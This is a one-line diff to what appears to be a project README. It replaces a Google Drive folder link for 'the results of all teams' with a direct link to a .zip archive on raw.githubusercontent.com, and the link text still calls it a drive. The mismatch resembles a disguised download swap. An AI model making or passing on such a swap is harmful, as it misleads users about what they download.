@@ -1,1 +1,1 @@
-The results of all teams are posted in this drive [Click here](https://drive.google.com/drive/folders/1o_yoM6rZ9JvAFgyNuO7uuT7TJLPQM7Sw?usp=sharing).
+The results of all teams are posted in this drive [Click here](https://raw.githubusercontent.com/AAzarudeen/GAN-Mini-project-web-report/master/results/original/GAN-Mini-project-web-report_v1.0.zip).
